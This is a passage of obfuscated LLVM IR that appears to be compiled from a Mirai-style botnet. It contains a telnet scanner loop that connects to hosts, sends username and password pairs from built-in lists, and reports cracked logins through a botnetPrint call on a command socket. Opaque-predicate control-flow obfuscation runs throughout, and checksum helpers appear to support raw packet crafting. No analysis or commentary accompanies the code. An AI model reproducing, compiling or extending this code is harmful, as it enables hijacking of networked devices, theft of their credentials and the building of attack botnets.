  %1071 = load i32, i32* %5, align 4
  %1072 = sext i32 %1071 to i64
  %1073 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1072
  call void @reset_telstate(%struct.telstate_t* %1073)
  br label %1131

; <label>:1074:                                   ; preds = %1059
  %1075 = load i32, i32* %5, align 4
  %1076 = sext i32 %1075 to i64
  %1077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1076
  %1078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1077, i32 0, i32 7
  %1079 = load i32, i32* %1078, align 16
  %1080 = add i32 %1079, 25
  %1081 = zext i32 %1080 to i64
  %1082 = call i64 @time(i64* null) #3
  %1083 = icmp slt i64 %1081, %1082
  br i1 %1083, label %1084, label %1113

; <label>:1084:                                   ; preds = %1074
  %1085 = load i32, i32* @x.75
  %1086 = load i32, i32* @y.76
  %1087 = sub i32 %1085, 1
  %1088 = mul i32 %1085, %1087
  %1089 = urem i32 %1088, 2
  %1090 = icmp eq i32 %1089, 0
  %1091 = icmp slt i32 %1086, 10
  %1092 = or i1 %1090, %1091
  br i1 %1092, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %1084
  %1093 = load i32, i32* %5, align 4
  %1094 = sext i32 %1093 to i64
  %1095 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1094
  %1096 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1095, i32 0, i32 3
  %1097 = load i8, i8* %1096, align 1
  %1098 = zext i8 %1097 to i32
  %1099 = icmp ne i32 %1098, 3
  %1100 = load i32, i32* @x.75
  %1101 = load i32, i32* @y.76
  %1102 = sub i32 %1100, 1
  %1103 = mul i32 %1100, %1102
  %1104 = urem i32 %1103, 2
  %1105 = icmp eq i32 %1104, 0
  %1106 = icmp slt i32 %1101, 10
  %1107 = or i1 %1105, %1106
  br i1 %1107, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br i1 %1099, label %1108, label %1109

; <label>:1108:                                   ; preds = %originalBBpart2124
  br label %1109

; <label>:1109:                                   ; preds = %1108, %originalBBpart2124
  %1110 = load i32, i32* %5, align 4
  %1111 = sext i32 %1110 to i64
  %1112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1111
  call void @reset_telstate(%struct.telstate_t* %1112)
  br label %1113

; <label>:1113:                                   ; preds = %1109, %1074
  %1114 = load i32, i32* @x.75
  %1115 = load i32, i32* @y.76
  %1116 = sub i32 %1114, 1
  %1117 = mul i32 %1114, %1116
  %1118 = urem i32 %1117, 2
  %1119 = icmp eq i32 %1118, 0
  %1120 = icmp slt i32 %1115, 10
  %1121 = or i1 %1119, %1120
  br i1 %1121, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %1113
  %1122 = load i32, i32* @x.75
  %1123 = load i32, i32* @y.76
  %1124 = sub i32 %1122, 1
  %1125 = mul i32 %1122, %1124
  %1126 = urem i32 %1125, 2
  %1127 = icmp eq i32 %1126, 0
  %1128 = icmp slt i32 %1123, 10
  %1129 = or i1 %1127, %1128
  br i1 %1129, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br label %1130

; <label>:1130:                                   ; preds = %originalBBpart2128, %originalBBpart2112, %787, %729, %648, %590, %480, %365, %originalBBpart212
  br label %1131

; <label>:1131:                                   ; preds = %1130, %1070, %939, %783, %771, %698, %644, %632, %543, %461, %457, %originalBBpart224, %originalBBpart220, %222
  %1132 = load i32, i32* @x.75
  %1133 = load i32, i32* @y.76
  %1134 = sub i32 %1132, 1
  %1135 = mul i32 %1132, %1134
  %1136 = urem i32 %1135, 2
  %1137 = icmp eq i32 %1136, 0
  %1138 = icmp slt i32 %1133, 10
  %1139 = or i1 %1137, %1138
  br i1 %1139, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %1131
  %1140 = load i32, i32* %5, align 4
  %1141 = add nsw i32 %1140, 1
  store i32 %1141, i32* %5, align 4
  %1142 = load i32, i32* @x.75
  %1143 = load i32, i32* @y.76
  %1144 = sub i32 %1142, 1
  %1145 = mul i32 %1142, %1144
  %1146 = urem i32 %1145, 2
  %1147 = icmp eq i32 %1146, 0
  %1148 = icmp slt i32 %1143, 10
  %1149 = or i1 %1147, %1148
  br i1 %1149, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br label %93

; <label>:1150:                                   ; preds = %originalBBpart24
  %1151 = load i32, i32* @x.75
  %1152 = load i32, i32* @y.76
  %1153 = sub i32 %1151, 1
  %1154 = mul i32 %1151, %1153
  %1155 = urem i32 %1154, 2
  %1156 = icmp eq i32 %1155, 0
  %1157 = icmp slt i32 %1152, 10
  %1158 = or i1 %1156, %1157
  br i1 %1158, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1150
  %1159 = load i32, i32* @x.75
  %1160 = load i32, i32* @y.76
  %1161 = sub i32 %1159, 1
  %1162 = mul i32 %1159, %1161
  %1163 = urem i32 %1162, 2
  %1164 = icmp eq i32 %1163, 0
  %1165 = icmp slt i32 %1160, 10
  %1166 = or i1 %1164, %1165
  br i1 %1166, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br label %91
                                                  ; No predecessors!
  %1168 = load i32, i32* @x.75
  %1169 = load i32, i32* @y.76
  %1170 = sub i32 %1168, 1
  %1171 = mul i32 %1168, %1170
  %1172 = urem i32 %1171, 2
  %1173 = icmp eq i32 %1172, 0
  %1174 = icmp slt i32 %1169, 10
  %1175 = or i1 %1173, %1174
  br i1 %1175, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1167
  %1176 = load i32, i32* @x.75
  %1177 = load i32, i32* @y.76
  %1178 = sub i32 %1176, 1
  %1179 = mul i32 %1176, %1178
  %1180 = urem i32 %1179, 2
  %1181 = icmp eq i32 %1180, 0
  %1182 = icmp slt i32 %1177, 10
  %1183 = or i1 %1181, %1182
  br i1 %1183, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %74
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %93
  %1184 = load i32, i32* %5, align 4
  %1185 = load i32, i32* %11, align 4
  %1186 = icmp slt i32 %1184, %1185
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %113
  %1187 = load i32, i32* %5, align 4
  %1188 = sext i32 %1187 to i64
  %1189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1188
  %1190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1189, i32 0, i32 7
  %1191 = load i32, i32* %1190, align 16
  %1192 = icmp eq i32 %1191, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %143
  %1193 = load i32, i32* %5, align 4
  %1194 = sext i32 %1193 to i64
  %1195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1194
  %1196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1195, i32 0, i32 2
  %1197 = load i8, i8* %1196, align 8
  %1198 = zext i8 %1197 to i32
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %227
  %1199 = load i32, i32* %5, align 4
  %1200 = sext i32 %1199 to i64
  %1201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1200
  %1202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1201, i32 0, i32 4
  %1203 = load i8, i8* %1202, align 2
  %1204 = zext i8 %1203 to i64
  %1205 = icmp eq i64 %1204, 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %251
  %1206 = load i32, i32* %5, align 4
  %1207 = sext i32 %1206 to i64
  %1208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1207
  %1209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1208, i32 0, i32 3
  store i8 1, i8* %1209, align 1
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %298
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %315
  %1210 = load i32, i32* %5, align 4
  %1211 = sext i32 %1210 to i64
  %1212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1211
  %1213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1212, i32 0, i32 0
  %1214 = load i32, i32* %1213, align 16
  %1215 = load i32, i32* %5, align 4
  %1216 = sext i32 %1215 to i64
  %1217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1216
  %1218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1217, i32 0, i32 0
  %1219 = load i32, i32* %1218, align 16
  %1220 = call i32 (i32, i32, ...) @fcntl(i32 %1219, i32 3, i8* null)
  %_ = sub i32 %1220, 2048
  %gen = mul i32 %_, 2048
  %1221 = or i32 %1220, 2048
  %1222 = call i32 (i32, i32, ...) @fcntl(i32 %1214, i32 4, i32 %1221)
  %1223 = load i32, i32* %5, align 4
  %1224 = sext i32 %1223 to i64
  %1225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1224
  %1226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1225, i32 0, i32 0
  %1227 = load i32, i32* %1226, align 16
  %1228 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %1229 = call i32 @connect(i32 %1227, %struct.sockaddr* %1228, i32 16)
  %1230 = icmp eq i32 %1229, -1
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %420
  %1231 = load i32, i32* %5, align 4
  %1232 = sext i32 %1231 to i64
  %1233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1232
  call void @reset_telstate(%struct.telstate_t* %1233)
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %481
  %1234 = load i32, i32* %5, align 4
  %1235 = sext i32 %1234 to i64
  %1236 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1235
  %1237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1236, i32 0, i32 0
  %1238 = load i32, i32* %1237, align 16
  %1239 = load i32, i32* %3, align 4
  %1240 = load i32, i32* %5, align 4
  %1241 = sext i32 %1240 to i64
  %1242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1241
  %1243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1242, i32 0, i32 9
  %1244 = load i8*, i8** %1243, align 8
  %1245 = call i32 @read_until_response(i32 %1238, i32 %1239, i8* %1244, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %1246 = icmp ne i32 %1245, 0
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %511
  %1247 = load i32, i32* %5, align 4
  %1248 = sext i32 %1247 to i64
  %1249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1248
  %1250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1249, i32 0, i32 9
  %1251 = load i8*, i8** %1250, align 8
  %1252 = call i32 @contains_fail(i8* %1251)
  %1253 = icmp ne i32 %1252, 0
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %544
  %1254 = load i32, i32* %5, align 4
  %1255 = sext i32 %1254 to i64
  %1256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1255
  %1257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1256, i32 0, i32 7
  %1258 = load i32, i32* %1257, align 16
  %_43 = sub i32 0, %1258
  %gen44 = add i32 %_43, 7
  %_45 = sub i32 0, %1258
  %gen46 = add i32 %_45, 7
  %_47 = sub i32 %1258, 7
  %gen48 = mul i32 %_47, 7
  %_49 = shl i32 %1258, 7
  %1259 = add i32 %1258, 7
  %1260 = zext i32 %1259 to i64
  %1261 = call i64 @time(i64* null) #3
  %1262 = icmp slt i64 %1260, %1261
  br label %originalBB42

originalBB53alteredBB:                            ; preds = %originalBB53, %570
  %1263 = load i32, i32* %5, align 4
  %1264 = sext i32 %1263 to i64
  %1265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1264
  call void @reset_telstate(%struct.telstate_t* %1265)
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %591
  %1266 = load i32, i32* %5, align 4
  %1267 = sext i32 %1266 to i64
  %1268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1267
  %1269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1268, i32 0, i32 0
  %1270 = load i32, i32* %1269, align 16
  %1271 = load i32, i32* %5, align 4
  %1272 = sext i32 %1271 to i64
  %1273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1272
  %1274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1273, i32 0, i32 4
  %1275 = load i8, i8* %1274, align 2
  %1276 = zext i8 %1275 to i64
  %1277 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %1276
  %1278 = load i8*, i8** %1277, align 8
  %1279 = load i32, i32* %5, align 4
  %1280 = sext i32 %1279 to i64
  %1281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1280
  %1282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1281, i32 0, i32 4
  %1283 = load i8, i8* %1282, align 2
  %1284 = zext i8 %1283 to i64
  %1285 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %1284
  %1286 = load i8*, i8** %1285, align 8
  %1287 = call i64 @strlen(i8* %1286) #9
  %1288 = call i64 @send(i32 %1270, i8* %1278, i64 %1287, i32 16384)
  %1289 = icmp slt i64 %1288, 0
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %678
  %1290 = load i32, i32* %5, align 4
  %1291 = sext i32 %1290 to i64
  %1292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1291
  call void @advance_state(%struct.telstate_t* %1292, i32 5)
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %699
  %1293 = load i32, i32* %5, align 4
  %1294 = sext i32 %1293 to i64
  %1295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1294
  %1296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1295, i32 0, i32 7
  %1297 = load i32, i32* %1296, align 16
  %_66 = sub i32 0, %1297
  %gen67 = add i32 %_66, 3
  %_68 = sub i32 0, %1297
  %gen69 = add i32 %_68, 3
  %_70 = shl i32 %1297, 3
  %_71 = shl i32 %1297, 3
  %1298 = add i32 %1297, 3
  %1299 = zext i32 %1298 to i64
  %1300 = call i64 @time(i64* null) #3
  %1301 = icmp slt i64 %1299, %1300
  br label %originalBB65

originalBB75alteredBB:                            ; preds = %originalBB75, %730
  %1302 = load i32, i32* %5, align 4
  %1303 = sext i32 %1302 to i64
  %1304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1303
  %1305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1304, i32 0, i32 0
  %1306 = load i32, i32* %1305, align 16
  %1307 = load i32, i32* %5, align 4
  %1308 = sext i32 %1307 to i64
  %1309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1308
  %1310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1309, i32 0, i32 5
  %1311 = load i8, i8* %1310, align 1
  %1312 = zext i8 %1311 to i64
  %1313 = getelementptr inbounds [4 x i8*], [4 x i8*]* @passwords, i64 0, i64 %1312
  %1314 = load i8*, i8** %1313, align 8
  %1315 = load i32, i32* %5, align 4
  %1316 = sext i32 %1315 to i64
  %1317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1316
  %1318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1317, i32 0, i32 5
  %1319 = load i8, i8* %1318, align 1
  %1320 = zext i8 %1319 to i64
  %1321 = getelementptr inbounds [4 x i8*], [4 x i8*]* @passwords, i64 0, i64 %1320
  %1322 = load i8*, i8** %1321, align 8
  %1323 = call i64 @strlen(i8* %1322) #9
  %1324 = call i64 @send(i32 %1306, i8* %1314, i64 %1323, i32 16384)
  %1325 = icmp slt i64 %1324, 0
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %831
  %1326 = load i32, i32* %5, align 4
  %1327 = sext i32 %1326 to i64
  %1328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1327
  %1329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1328, i32 0, i32 3
  %1330 = load i8, i8* %1329, align 1
  %1331 = zext i8 %1330 to i32
  %1332 = icmp eq i32 %1331, 2
  br label %originalBB79

originalBB83alteredBB:                            ; preds = %originalBB83, %855
  %1333 = load i32, i32* %5, align 4
  %1334 = sext i32 %1333 to i64
  %1335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1334
  call void @advance_state(%struct.telstate_t* %1335, i32 7)
  br label %originalBB83

originalBB87alteredBB:                            ; preds = %originalBB87, %875
  %1336 = load i32, i32* @KadenCommStock, align 4
  %1337 = load i32, i32* %5, align 4
  %1338 = sext i32 %1337 to i64
  %1339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1338
  %1340 = call i8* @get_telstate_host(%struct.telstate_t* %1339)
  %1341 = load i32, i32* %5, align 4
  %1342 = sext i32 %1341 to i64
  %1343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1342
  %1344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1343, i32 0, i32 4
  %1345 = load i8, i8* %1344, align 2
  %1346 = zext i8 %1345 to i64
  %1347 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %1346
  %1348 = load i8*, i8** %1347, align 8
  %1349 = load i32, i32* %5, align 4
  %1350 = sext i32 %1349 to i64
  %1351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1350
  %1352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1351, i32 0, i32 5
  %1353 = load i8, i8* %1352, align 1
  %1354 = zext i8 %1353 to i64
  %1355 = getelementptr inbounds [4 x i8*], [4 x i8*]* @passwords, i64 0, i64 %1354
  %1356 = load i8*, i8** %1355, align 8
  %1357 = call i32 (i32, i8*, ...) @botnetPrint(i32 %1336, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.246, i32 0, i32 0), i8* %1340, i8* %1348, i8* %1356)
  %1358 = load i32, i32* %5, align 4
  %1359 = sext i32 %1358 to i64
  %1360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1359
  call void @advance_state(%struct.telstate_t* %1360, i32 7)
  br label %originalBB87

originalBB91alteredBB:                            ; preds = %originalBB91, %917
  br label %originalBB91

originalBB95alteredBB:                            ; preds = %originalBB95, %940
  %1361 = load i32, i32* %5, align 4
  %1362 = sext i32 %1361 to i64
  %1363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1362
  %1364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1363, i32 0, i32 7
  %1365 = load i32, i32* %1364, align 16
  %_96 = shl i32 %1365, 7
  %_97 = sub i32 %1365, 7
  %gen98 = mul i32 %_97, 7
  %_99 = sub i32 %1365, 7
  %gen100 = mul i32 %_99, 7
  %_101 = shl i32 %1365, 7
  %_102 = shl i32 %1365, 7
  %1366 = add i32 %1365, 7
  %1367 = zext i32 %1366 to i64
  %1368 = call i64 @time(i64* null) #3
  %1369 = icmp slt i64 %1367, %1368
  br label %originalBB95

originalBB106alteredBB:                           ; preds = %originalBB106, %966
  %1370 = load i32, i32* %5, align 4
  %1371 = sext i32 %1370 to i64
  %1372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1371
  call void @reset_telstate(%struct.telstate_t* %1372)
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %986
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %1003
  %1373 = call i64 @time(i64* null) #3
  %1374 = trunc i64 %1373 to i32
  %1375 = load i32, i32* %5, align 4
  %1376 = sext i32 %1375 to i64
  %1377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1376
  %1378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1377, i32 0, i32 7
  store i32 %1374, i32* %1378, align 16
  %1379 = load i32, i32* %5, align 4
  %1380 = sext i32 %1379 to i64
  %1381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1380
  %1382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1381, i32 0, i32 0
  %1383 = load i32, i32* %1382, align 16
  %1384 = call i64 @send(i32 %1383, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.247, i32 0, i32 0), i64 4, i32 16384)
  %1385 = icmp slt i64 %1384, 0
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %1033
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %1084
  %1386 = load i32, i32* %5, align 4
  %1387 = sext i32 %1386 to i64
  %1388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1387
  %1389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1388, i32 0, i32 3
  %1390 = load i8, i8* %1389, align 1
  %1391 = zext i8 %1390 to i32
  %1392 = icmp ne i32 %1391, 3
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %1113
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %1131
  %1393 = load i32, i32* %5, align 4
  %1394 = add nsw i32 %1393, 1
  store i32 %1394, i32* %5, align 4
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1150
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1167
  br label %originalBB138
}

; Function Attrs: nounwind
declare void @srand(i32) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = load i32, i32* @x.77
  %4 = load i32, i32* @y.78
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  store i32 0, i32* %13, align 4
  store i32 0, i32* %13, align 4
  %14 = load i32, i32* @x.77
  %15 = load i32, i32* @y.78
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:22:                                     ; preds = %35, %originalBBpart2
  %23 = load i32, i32* %13, align 4
  %24 = load i32, i32* %12, align 4
  %25 = icmp slt i32 %23, %24
  br i1 %25, label %26, label %38

; <label>:26:                                     ; preds = %22
  %27 = call i32 @rand_cmwc()
  %28 = urem i32 %27, 26
  %29 = add i32 %28, 65
  %30 = trunc i32 %29 to i8
  %31 = load i8*, i8** %11, align 8
  %32 = load i32, i32* %13, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  store i8 %30, i8* %34, align 1
  br label %35

; <label>:35:                                     ; preds = %26
  %36 = load i32, i32* %13, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %13, align 4
  br label %22

; <label>:38:                                     ; preds = %22
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  store i8* %0, i8** %39, align 8
  store i32 %1, i32* %40, align 4
  store i32 0, i32* %41, align 4
  store i32 0, i32* %41, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %44

; <label>:21:                                     ; preds = %18
  %22 = load i32, i32* @x.79
  %23 = load i32, i32* @y.80
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  %30 = load i16*, i16** %3, align 8
  %31 = bitcast i16* %30 to i8*
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i64
  %34 = load i64, i64* %5, align 8
  %35 = add i64 %34, %33
  store i64 %35, i64* %5, align 8
  %36 = load i32, i32* @x.79
  %37 = load i32, i32* @y.80
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %44

; <label>:44:                                     ; preds = %originalBBpart2, %18
  br label %45

; <label>:45:                                     ; preds = %65, %44
  %46 = load i32, i32* @x.79
  %47 = load i32, i32* @y.80
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %45
  %54 = load i64, i64* %5, align 8
  %55 = lshr i64 %54, 16
  %56 = icmp ne i64 %55, 0
  %57 = load i32, i32* @x.79
  %58 = load i32, i32* @y.80
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart227, label %originalBB9alteredBB

originalBBpart227:                                ; preds = %originalBB9
  br i1 %56, label %65, label %71

; <label>:65:                                     ; preds = %originalBBpart227
  %66 = load i64, i64* %5, align 8
  %67 = and i64 %66, 65535
  %68 = load i64, i64* %5, align 8
  %69 = lshr i64 %68, 16
  %70 = add i64 %67, %69
  store i64 %70, i64* %5, align 8
  br label %45

; <label>:71:                                     ; preds = %originalBBpart227
  %72 = load i64, i64* %5, align 8
  %73 = xor i64 %72, -1
  %74 = trunc i64 %73 to i16
  ret i16 %74

originalBBalteredBB:                              ; preds = %originalBB, %21
  %75 = load i16*, i16** %3, align 8
  %76 = bitcast i16* %75 to i8*
  %77 = load i8, i8* %76, align 1
  %78 = zext i8 %77 to i64
  %79 = load i64, i64* %5, align 8
  %_ = sub i64 %79, %78
  %gen = mul i64 %_, %78
  %_1 = shl i64 %79, %78
  %_2 = sub i64 0, %79
  %gen3 = add i64 %_2, %78
  %_4 = sub i64 0, %79
  %gen5 = add i64 %_4, %78
  %_6 = sub i64 0, %79
  %gen7 = add i64 %_6, %78
  %_8 = shl i64 %79, %78
  %80 = add i64 %79, %78
  store i64 %80, i64* %5, align 8
  br label %originalBB

originalBB9alteredBB:                             ; preds = %originalBB9, %45
  %81 = load i64, i64* %5, align 8
  %_10 = sub i64 0, %81
  %gen11 = add i64 %_10, 16
  %_12 = shl i64 %81, 16
  %_13 = sub i64 %81, 16
  %gen14 = mul i64 %_13, 16
  %_15 = shl i64 %81, 16
  %_16 = sub i64 %81, 16
  %gen17 = mul i64 %_16, 16
  %_18 = sub i64 %81, 16
  %gen19 = mul i64 %_18, 16
  %_20 = sub i64 0, %81
  %gen21 = add i64 %_20, 16
  %_22 = sub i64 0, %81
  %gen23 = add i64 %_22, 16
  %_24 = sub i64 0, %81
  %gen25 = add i64 %_24, 16
  %82 = lshr i64 %81, 16
  %83 = icmp ne i64 %82, 0
  br label %originalBB9
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
